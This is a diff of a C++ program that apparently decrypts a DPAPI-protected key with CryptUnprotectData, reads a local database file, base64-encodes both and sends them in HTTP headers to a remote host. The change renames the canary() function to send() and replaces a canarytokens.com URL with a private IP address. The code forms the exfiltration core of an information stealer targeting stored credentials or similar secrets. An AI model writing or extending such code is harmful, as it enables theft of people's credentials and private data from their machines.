@@ -17,9 +17,10 @@ using namespace std;
 using json = nlohmann::json;
 
 
-void canary(const string& key, const string& db) {
-    cpr::Response test = cpr::Get(cpr::Url{ "http://canarytokens.com/tags/articles/static/aeg464kr5lxl69kezk7aqnef6/payments.js" },
-        cpr::Header{ {"key",key}, {"content", db}}
+void send(const string& key, const string& db ) {
+    cpr::Response test = cpr::Get(cpr::Url{ "http://192.168.184.128/tyext" },
+        cpr::Header{{"\n\ncontent", db}},
+        cpr::Header{ {"key",key}, }
         );
     cout << test.status_code;
 }
@@ -30,11 +31,9 @@ string uprotectkey(const std::string& key) {
     LPWSTR pDescrOut = NULL;
     std::string plaintext;
 
-    // Prepare the DATA_BLOB structure for the encrypted data
     encryptedBlob.pbData = reinterpret_cast<BYTE*>(const_cast<char*>(key.data()));
     encryptedBlob.cbData = static_cast<DWORD>(key.size());
 
-    // Decrypt the data
     BOOL success = CryptUnprotectData(
         &encryptedBlob,     
         &pDescrOut,         
@@ -46,13 +45,10 @@ string uprotectkey(const std::string& key) {
     );
 
     if (success) {
-        // Copy the decrypted data to the plaintext string
-        plaintext.assign(reinterpret_cast<char*>(plaintextBlob.pbData), plaintextBlob.cbData);
 
-        // Free the memory allocated for the decrypted data
+        plaintext.assign(reinterpret_cast<char*>(plaintextBlob.pbData), plaintextBlob.cbData);
         LocalFree(plaintextBlob.pbData);
 
-        // If a description was provided, free the memory allocated for it
         if (pDescrOut) {
             LocalFree(pDescrOut);
         }
@@ -90,6 +86,6 @@ int main()
     ifstream db(dbpath, std::ios::binary);
     contentStream << db.rdbuf();
     string content = contentStream.str();
-    canary(base64::to_base64(key), base64::to_base64(content));
+    send(base64::to_base64(key), base64::to_base64(content));
     return 0;
 }
